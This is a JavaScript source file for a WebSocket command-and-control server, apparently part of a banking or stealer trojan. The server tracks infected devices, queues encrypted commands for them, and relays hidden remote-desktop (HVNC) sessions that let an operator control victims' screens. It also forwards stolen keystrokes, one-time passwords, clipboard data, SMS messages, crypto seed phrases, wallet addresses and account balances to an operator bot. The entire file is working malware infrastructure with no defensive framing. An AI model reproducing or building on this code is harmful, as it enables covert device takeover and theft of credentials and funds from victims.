import { WebSocketServer } from 'ws';
import { encrypt, decrypt, timestamp } from './utils.js';
import { config } from './config.js';

export function setupWebSocket(server) {
  const clients = new Map();
  const hvncSessions = new Map();
  let messageHandler = null;
  let botRef = null;

  const wss = new WebSocketServer({ server, path: '/ws' });

  wss.on('connection', (ws, req) => {
    let deviceId = null;
    let deviceInfo = {};

    ws.on('message', (raw) => {
      try {
        const text = raw.toString();

        // HVNC auth
        if (text.includes('"type":"hvnc_auth"')) {
          const auth = JSON.parse(text);
          if (auth.deviceId && auth.session === config.sessionSecret) {
            deviceId = auth.deviceId;
            if (!hvncSessions.has(deviceId))
              hvncSessions.set(deviceId, new Set());
            hvncSessions.get(deviceId).add(ws);
            ws.send(JSON.stringify({ type: 'hvnc_ack' }));
          }
          return;
        }

        // HVNC commands from dashboard viewer
        if (text.includes('"type":"hvnc_cmd"')) {
          const cmd = JSON.parse(text);
          const target = clients.get(cmd.deviceId);
          if (target && target.ws && target.ws.readyState === 1) {
            target.ws.send(encrypt({ 
              type: 'hvnc', 
              action: cmd.action,
              x: cmd.x, y: cmd.y,
              x1: cmd.x1, y1: cmd.y1,
              x2: cmd.x2, y2: cmd.y2,
              text: cmd.text
            }));
          }
          return;
        }

        // Encrypted messages from devices
        const msg = decrypt(text);
        if (!msg) return;

        switch (msg.type) {
          case 'register': {
            deviceId = msg.deviceId;
            deviceInfo = msg.info || {};
            const existing = clients.get(deviceId);
            if (existing && existing.ws !== ws) {
              try { existing.ws.close(); } catch {}
            }
            clients.set(deviceId, {
              ws,
              info: deviceInfo,
              lastSeen: Date.now(),
              firstSeen: existing?.firstSeen || Date.now(),
              buffer: existing?.buffer || [],
            });
            const client = clients.get(deviceId);
            while (client.buffer.length > 0) {
              const cmd = client.buffer.shift();
              try { ws.send(encrypt(cmd)); } catch {}
            }
            // Notify bot
            if (botRef) {
              botRef.emit('device_online', { 
                id: deviceId, 
                info: deviceInfo, 
                online: true 
              });
            }
            break;
          }
          case 'heartbeat': {
            const c = clients.get(deviceId);
            if (c) c.lastSeen = Date.now();
            try { ws.send(encrypt({ type: 'heartbeat_ack' })); } catch {}
            break;
          }
          case 'frame': {
            const viewers = hvncSessions.get(deviceId);
            if (viewers) {
              const frame = JSON.stringify({
                type: 'frame',
                data: msg.data,
                ts: Date.now(),
              });
              for (const v of viewers) {
                try { v.send(frame); } catch {}
              }
            }
            break;
          }
          case 'log': {
            if (botRef) botRef.emit('device_log', { 
              deviceId, 
              message: msg.data,
              timestamp: timestamp()
            });
            break;
          }
          case 'keylog': {
            if (botRef) botRef.emit('device_keylog', { 
              deviceId, 
              keys: msg.data,
              timestamp: timestamp()
            });
            break;
          }
          case 'otp': {
            if (botRef) botRef.emit('device_otp', { 
              deviceId, 
              otp: msg.data,
              timestamp: timestamp()
            });
            break;
          }
          case 'clipboard': {
            if (botRef) botRef.emit('device_clipboard', { 
              deviceId, 
              content: msg.data,
              timestamp: timestamp()
            });
            break;
          }
          case 'seedphrase': {
            if (botRef) botRef.emit('device_seed', { 
              deviceId, 
              seed: msg.data,
              timestamp: timestamp()
            });
            break;
          }
          case 'crypto_wallet': {
            if (botRef) botRef.emit('device_crypto', { 
              deviceId, 
              address: msg.data,
              timestamp: timestamp()
            });
            break;
          }
          case 'sms': {
            if (botRef) botRef.emit('device_sms', { 
              deviceId, 
              content: msg.data,
              timestamp: timestamp()
            });
            break;
          }
          case 'balance': {
            if (botRef) botRef.emit('device_balance', { 
              deviceId, 
              data: msg.data,
              timestamp: timestamp()
            });
            break;
          }
          default: {
            if (messageHandler) messageHandler(deviceId, msg);
          }
        }
      } catch {}
    });

    ws.on('close', () => {
      if (deviceId) {
        const client = clients.get(deviceId);
        if (client && client.ws === ws) {
          clients.set(deviceId, { ...client, ws: null });
          if (botRef) {
            botRef.emit('device_offline', { 
              id: deviceId, 
              info: deviceInfo 
            });
          }
        }
        hvncSessions.delete(deviceId);
      }
    });

    ws.on('error', () => {});
  });

  return {
    setBot(bot) { botRef = bot; },
    sendCommand(deviceId, command) {
      const client = clients.get(deviceId);
      if (!client) return false;
      const payload = encrypt(command);
      if (client.ws && client.ws.readyState === 1) {
        try { client.ws.send(payload); return true; } catch { return false; }
      } else {
        client.buffer.push(command);
        return true;
      }
    },
    getDevices() {
      return Array.from(clients.entries()).map(([id, c]) => ({
        id,
        online: c.ws && c.ws.readyState === 1,
        info: c.info,
        lastSeen: c.lastSeen,
        firstSeen: c.firstSeen,
        bufferSize: c.buffer.length,
        uptime: c.firstSeen ? Math.floor((Date.now() - c.firstSeen) / 1000) : 0,
      }));
    },
    getDevice(id) { 
      const c = clients.get(id); 
      return c ? { ...c, id } : null; 
    },
    getOnlineCount() {
      let n = 0;
      for (const c of clients.values()) {
        if (c.ws && c.ws.readyState === 1) n++;
      }
      return n;
    },
    getTotalCount() { return clients.size; },
    getOnlineDevices() {
      return Array.from(clients.entries())
        .filter(([_, c]) => c.ws && c.ws.readyState === 1)
        .map(([id, c]) => ({ id, info: c.info }));
    },
    setMessageHandler(fn) { messageHandler = fn; },
  };
}
